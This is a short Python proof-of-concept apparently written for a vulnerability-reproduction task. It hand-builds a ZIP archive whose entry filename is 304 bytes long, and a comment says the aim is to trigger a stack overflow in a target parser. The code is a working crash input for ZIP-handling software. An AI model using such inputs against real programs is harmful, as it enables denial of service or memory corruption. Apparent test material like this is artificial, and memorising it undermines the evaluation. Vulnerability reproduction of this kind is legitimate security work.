import os
import struct
import zlib


class Solution:
    def _make_zip(self, filename: bytes, data: bytes = b"") -> bytes:
        if not isinstance(filename, (bytes, bytearray)):
            filename = str(filename).encode("utf-8", "ignore")
        if not isinstance(data, (bytes, bytearray)):
            data = bytes(data)

        crc = zlib.crc32(data) & 0xFFFFFFFF
        comp_size = len(data)
        uncomp_size = len(data)
        fn_len = len(filename)
        extra = b""
        extra_len = len(extra)

        local_header_sig = 0x04034B50
        central_header_sig = 0x02014B50
        eocd_sig = 0x06054B50

        version_needed = 20
        version_made_by = 20
        flags = 0
        compression = 0
        mod_time = 0
        mod_date = 0

        local_header = struct.pack(
            "<IHHHHHIIIHH",
            local_header_sig,
            version_needed,
            flags,
            compression,
            mod_time,
            mod_date,
            crc,
            comp_size,
            uncomp_size,
            fn_len,
            extra_len,
        )

        local_offset = 0
        local_record = local_header + filename + extra + data

        central_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            central_header_sig,
            version_made_by,
            version_needed,
            flags,
            compression,
            mod_time,
            mod_date,
            crc,
            comp_size,
            uncomp_size,
            fn_len,
            0,  # extra len
            0,  # comment len
            0,  # disk start
            0,  # internal attrs
            0,  # external attrs
            local_offset,
        )
        central_record = central_header + filename

        cd_offset = len(local_record)
        cd_size = len(central_record)

        eocd = struct.pack(
            "<IHHHHIIH",
            eocd_sig,
            0,  # disk number
            0,  # disk start
            1,  # entries on disk
            1,  # total entries
            cd_size,
            cd_offset,
            0,  # comment len
        )

        return local_record + central_record + eocd

    def solve(self, src_path: str) -> bytes:
        # Trigger stack overflow by providing a ZIP entry filename > 256 bytes.
        long_name = (b"A" * 300) + b".txt"
        return self._make_zip(long_name, b"")